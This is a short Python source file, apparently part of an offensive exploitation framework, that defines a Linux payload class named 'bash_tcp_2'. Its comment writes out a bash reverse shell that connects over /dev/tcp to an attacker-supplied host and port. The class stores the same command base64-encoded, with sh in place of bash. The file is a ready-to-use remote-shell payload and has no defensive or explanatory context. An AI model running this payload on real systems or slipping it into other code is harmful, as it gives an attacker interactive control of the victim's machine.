from lib.framework.core.payload import Payload


# 0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; bash <&196 >&196 2>&196
class bash_tcp_2(Payload):
    name = "bash_tcp_2"
    platform = ["linux"]
    payload = "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97TEhPU1R9L3tMUE9SVH07IHNoIDwmMTk2ID4mMTk2IDI+JjE5Ng=="
